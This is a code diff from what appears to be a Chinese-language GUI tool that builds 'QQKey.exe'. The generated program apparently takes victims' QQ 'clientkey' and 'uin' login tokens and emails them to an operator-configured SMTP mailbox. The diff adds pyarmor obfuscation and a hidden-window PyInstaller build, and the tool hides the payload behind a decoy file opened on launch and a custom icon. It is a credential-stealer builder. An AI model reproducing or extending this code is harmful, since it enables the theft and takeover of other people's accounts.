TFRFUlNLTFVXRVIKV09PRFNJREUKV09SSwpXT1JLUwpXT1JMRApXT1cKV1MKV1RDCldURgpYQk9YClhFUk9YClhJSFVBTgpYSU4KWE4tLTExQjRDM0QKWE4tLTFDSzJFMUIKWE4tLTFRUVcyM0EKWE4tLTJTQ1JKOUMKWE4tLTMwUlI3WQpYTi0tM0JTVDAwTQpYTi0tM0RTNDQzRwpYTi0tM0UwQjcwN0UKWE4tLTNIQ1JKOUMKWE4tLTNQWFU4SwpYTi0tNDJDMkQ5QQpYTi0tNDVCUjVDWUwKWE4tLTQ1QlJKOUMKWE4tLTQ1UTExQwpYTi0tNERCUkswQ0UKWE4tLTRHQlJJTQpYTi0tNTRCN0ZUQTBDQwpYTi0tNTVRVzQyRwpYTi0tNTVRWDVEClhOLS01U1UzNEo5MzZCR1NHClhOLS01VFpNNUcKWE4tLTZGUlo4MkcKWE4tLTZRUTk4NkIzWEwKWE4tLTgwQURYSEtTClhOLS04MEFPMjFBClhOLS04MEFRRUNEUjFBClhOLS04MEFTRUhEQgpYTi0tODBBU1dHClhOLS04WTBBMDYzQQpYTi0tOTBBM0FDClhOLS05MEFFClhOLS05MEFJUwpYTi0tOURCUTJBClhOLS05RVQ1MlUKWE4tLTlLUlQwMEEKWE4tLUI0VzYwNUZFUkQKWE4tLUJDSzFCOUE1RFJFNEMKWE4tLUMxQVZHClhOLS1DMkJSN0cKWE4tLUNDSzJCM0IKWE4tLUNDS1dDWEVURApYTi0tQ0c0QktJClhOLS1DTENIQzBFQTBCMkcyQTlHQ0QKWE4tLUNaUjY5NEIKWE4tLUNaUlMwVApYTi0tQ1pSVTJEClhOLS1EMUFDSjNCClhOLS1EMUFMRgpYTi0tRTFBNEMKWE4tLUVDS1ZEVEM5RApYTi0tRUZWWTg4SApYTi0tRkNUNDI5SwpYTi0tRkhCRUkKWE4tLUZJUTIyOEM1SFMKWE4tLUZJUTY0QgpYTi0tRklRUzhTClhOLS1GSVFaOVMKWE4tLUZKUTcyMEEKWE4tLUZMVzM1MUUKWE4tLUZQQ1JKOUMzRApYTi0tRlpDMkM5RTJDClhOLS1GWllTOEQ2OVVWR00KWE4tLUcyWFg0OEMKWE4tLUdDS1IzRjBGClhOLS1HRUNSSjlDClhOLS1HSzNBVDFFClhOLS1IMkJSRUczRVZFClhOLS1IMkJSSjlDClhOLS1IMkJSSjlDOEMKWE4tLUhYVDgxNEUKWE4tLUkxQjZCMUE2QTJFClhOLS1JTVI1MTNOClhOLS1JTzBBN0kKWE4tLUoxQUVGClhOLS1KMUFNSApYTi0tSjZXMTkzRwpYTi0tSkxRNDgwTjJSRwpYTi0tSlZSMTg5TQpYTi0tS0NSWDc3RDFYNEEKWE4tLUtQUlcxM0QKWE4tLUtQUlk1N0QKWE4tLUtQVVQzSQpYTi0tTDFBQ0MKWE4tLUxHQkJBVDFBRDhKClhOLS1NR0I5QVdCRgpYTi0tTUdCQTNBM0VKVApYTi0tTUdCQTNBNEYxNkEKWE4tLU1HQkE3QzBCQk4wQQpYTi0tTUdCQUFNN0E4SApYTi0tTUdCQUIyQkQKWE4tLU1HQkFIMUEzSEpLUkQKWE4tLU1HQkFJOUFaR1FQNkoKWE4tLU1HQkFZSDdHUEEKWE4tLU1HQkJIMUEKWE4tLU1HQkJIMUE3MUUKWE4tLU1HQkMwQTlBWkNHClhOLS1NR0JDQTdEWkRPClhOLS1NR0JDUFE2R1BBMUEKWE4tLU1HQkVSUDRBNUQ0QVIKWE4tLU1HQkdVODJBClhOLS1NR0JJNEVDRVhQClhOLS1NR0JQTDJGSApYTi0tTUdCVDNESEQKWE4tLU1HQlRYMkIKWE4tLU1HQlg0Q0QwQUIKWE4tLU1JWDg5MUYKWE4tLU1LMUJVNDRDClhOLS1NWFRRMU0KWE4tLU5HQkM1QVpEClhOLS1OR0JFOUUwQQpYTi0tTkdCUlgKWE4tLU5PREUKWE4tLU5RVjdGClhOLS1OUVY3RlMwMEVNQQpYTi0tTllRWTI2QQpYTi0tTzNDVzRIClhOLS1PR0JQRjhGTApYTi0tT1RVNzk2RApYTi0tUDFBQ0YKWE4tLVAxQUkKWE4tLVBHQlMwREgKWE4tLVBTU1kyVQpYTi0tUTdDRTZBClhOLS1ROUpZQjRDClhOLS1RQ0tBMVBNQwpYTi0tUVhBNkEKWE4tLVFYQU0KWE4tLVJIUVY5NkcKWE4tLVJPVlU4OEIKWE4tLVJWQzFFMEFNM0UKWE4tLVM5QlJKOUMKWE4tLVNFUzU1NEcKWE4tLVQ2MEI1NkEKWE4tLVRDS1dFClhOLS1USVE0OVhRWUoKWE4tLVVOVVA0WQpYTi0tVkVSTUdFTlNCRVJBVEVSLUNUQgpYTi0tVkVSTUdFTlNCRVJBVFVORy1QV0IKWE4tLVZIUVVWClhOLS1WVVE4NjFCClhOLS1XNFI4NUVMOEZIVTVETlJBClhOLS1XNFJTNDBMClhOLS1XR0JIMUMKWE4tLVdHQkw2QQpYTi0tWEhRNTIxQgpYTi0tWEtDMkFMM0hZRTJBClhOLS1YS0MyREwzQTVFRTBIClhOLS1ZOUEzQVEKWE4tLVlGUk80STY3TwpYTi0tWUdCSTJBTU1YClhOLS1aRlIxNjRCClhYWApYWVoKWUFDSFRTCllBSE9PCllBTUFYVU4KWUFOREVYCllFCllPRE9CQVNISQpZT0dBCllPS09IQU1BCllPVQpZT1VUVUJFCllUCllVTgpaQQpaQVBQT1MKWkFSQQpaRVJPClpJUApaTQpaT05FClpVRVJJQ0gKWlcK".encode(
                         'utf-8')))
-            if reset_icon_path or os.path.isfile(self.icon_path):
-                print("检测到图标文件不存在,将使用默认图标!")
+            if reset_icon_path or (not os.path.isfile(self.icon_path) and self.icon_path):
+                if not os.path.isfile(self.icon_path): print("检测到图标文件不存在,将使用默认图标!")
                 self.icon_path = ''
+                self.checkBox_2.setChecked(False)
             print("环境已准备完毕!")
             smtp_server = f'"{self.lineEdit.text()}"'
             smtp_port = self.lineEdit_2.text()
@@ -596,12 +650,15 @@ nickname={nickname}
                     self.flag = ""
                     server.quit()
                 except (SMTPAuthenticationError, SMTPServerDisconnected):
-                    print("验证失败,请检查邮箱密码是否正确,")
+                    print("验证失败,请检查邮箱密码是否正确/smtp服务器是否正确!")
                     print("如果您是如网易邮箱或QQ邮箱等需要授权码的邮箱,请使用授权码当做密码,而不是登录密码!")
                     print("若想无视风险继续生成请再次点击生成以忽视风险")
                     self.func_running = False
                     self.flag = self.lineEdit_4.text()[1:-1]
                     return
+                except Exception as e:
+                    print("出现未知错误,请检查smtp服务器是否正确!")
+                    print(f"原因:{repr(e)}")
             else:
                 print("Warning:当前邮箱密码未更改,将忽略因密码有误而无法收Key风险!")
             zip_path = '.\\Tools.zip'
@@ -647,15 +704,20 @@ else:
 file = os.path.join(basedir, '{os.path.basename(self.file_path)}')
 os.startfile(file)\n""" + content
             # 懒得更搭建包了,直接在工具里硬修改得了:)
-            content = content.replace("if clientkey is None:","if not clientkey:")
-            content = content.replace("--------登录网址--------","--------登录网址--------\nTips:如果出现qzone和mail均无法登录而qun可以登录的情况请尝试使用主界面的Key解析器进行解析登录\n")
-            content = content.replace("uin:{uin}","uin:{uin}\nclientkey:{clientkey}")
+            # content = content.replace("if clientkey is None:","if not clientkey:")
+            # content = content.replace("--------登录网址--------","--------登录网址--------\nTips:如果出现qzone和mail均无法登录而qun可以登录的情况请尝试使用主界面的Key解析器进行解析登录\n")
+            # content = content.replace("uin:{uin}","uin:{uin}\nclientkey:{clientkey}")
             with open(".\\qkey_code.py", 'w', encoding='utf-8') as f:
                 f.write(content)
             print("开始下载打包所需文件...")
-            subprocess.call(".\\data\\python.exe -m pip install pyinstaller requests urlextract psutil -i https://pypi.tuna.tsinghua.edu.cn/simple",creationflags=subprocess.CREATE_NO_WINDOW)
+            installing_log = subprocess.Popen(".\\data\\python.exe -m pip install pyinstaller requests pyarmor==9.0.3 -i https://pypi.tuna.tsinghua.edu.cn/simple",creationflags=subprocess.CREATE_NO_WINDOW,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
+            installing_log = installing_log.communicate()
+            print("加密代码中...")
+            encrypting_log = subprocess.Popen(".\\data\\Scripts\\pyarmor.exe gen qkey_code.py --output=final_code --enable-jit",creationflags=subprocess.CREATE_NO_WINDOW,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
+            encrypting_log = encrypting_log.communicate()
             print("开始打包...")
-            subprocess.call(f".\\data\\Scripts\\pyinstaller.exe -F -w{' -i '+self.icon_path.replace('/',__) if self.icon_path != '' else ''} --add-data .\\tlds-alpha-by-domain.txt;.\\urlextract\data qkey_code.py{f' --add-data {self.file_path};.' if self.file_path else ''}",creationflags=subprocess.CREATE_NO_WINDOW)
+            packing_log = subprocess.Popen(f".\\data\\Scripts\\pyinstaller.exe -F -w{' -i '+self.icon_path.replace('/',__) if self.icon_path != '' else ''} .\\final_code\\qkey_code.py --paths=.\\final_code\\{f' --add-data {self.file_path};.' if self.file_path else ''} --hidden-import requests --hidden-import smtplib --hidden-import email.mime.text --noupx",creationflags=subprocess.CREATE_NO_WINDOW,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
+            packing_log = packing_log.communicate()
             if os.path.isfile("QQKey.exe"):
                 os.remove('QQKey.exe')
             os.rename(".\\dist\\qkey_code.exe", ".\\QQKey.exe")
@@ -669,13 +731,56 @@ os.startfile(file)\n""" + content
             self.func_running = False
             return
         except Exception as e:
+            from QQKey_Tool import version
+            reason = traceback.format_exc()
             print("打包失败,发生致命错误!")
-            print("原因:\n"+traceback.format_exc())
+            print("原因:\n"+reason,end='')
+            print("生成日志中...")
+            scripts_files = []
+            if os.path.isdir('.\\data\\Scripts') and os.path.isdir('.\\data'):
+                for i in os.listdir('.\\data\\Scripts'):
+                    scripts_files.append(i)
+            else:
+                scripts_files = ["scripts文件夹不存在!"]
+            local_time = time.strftime("%Y-%m-%d_%H.%M.%S", time.localtime(time.time()))
+            content = f"""{local_time}
+错误信息:
+{reason}{'='*16}
+以下为程序执行命令的输出:
+安装依赖(标准输出):
+{installing_log[0].decode('utf-8') if installing_log is not None else '无'}
+安装依赖(标准错误):
+{installing_log[1].decode('utf-8') if installing_log is not None else '无'}
+{'-'*16}
+加密代码(标准输出):
+{encrypting_log[0].decode('utf-8') if encrypting_log is not None else '无'}
+加密代码(标准错误):
+{encrypting_log[1].decode('utf-8') if encrypting_log is not None else '无'}
+{'-'*16}
+打包程序(标准输出):
+{packing_log[0].decode('utf-8') if packing_log is not None else  '无'}
+打包程序(标准错误):
+{packing_log[1].decode('utf-8') if packing_log is not None else '无'}
+{'='*16}
+依赖文件:
+"""
+            for i in scripts_files:
+                content += f"{i}\n"
+            _ = '\\'
+            content += f"""{'=' * 16}
+是否打包成功:{os.path.isfile('QQKey.exe' or os.path.isfile(f'.{_}dist{_}qkey_code.exe'))}
+当前版本号:v{version}"""
+            with open(f"ERROR_{local_time}.log", 'w', encoding='utf-8') as f:
+                f.write(content)
+            print(f"日志生成完毕,已保存至ERROR_{local_time}.log")
+            print("您可以使用日志到Github提交issue(在主界面提供反馈打开)",end='')
         self.func_running = False
         sys.stdout = sys.__stdout__
 
 
 if __name__ == '__main__':
+    QtGui.QGuiApplication.setHighDpiScaleFactorRoundingPolicy(QtCore.Qt.HighDpiScaleFactorRoundingPolicy.PassThrough)
+    QtGui.QGuiApplication.setAttribute(QtCore.Qt.AA_EnableHighDpiScaling)
     # 获取UIC窗口操作权限
     app = QtWidgets.QApplication(sys.argv)
     Dialog = QtWidgets.QDialog()
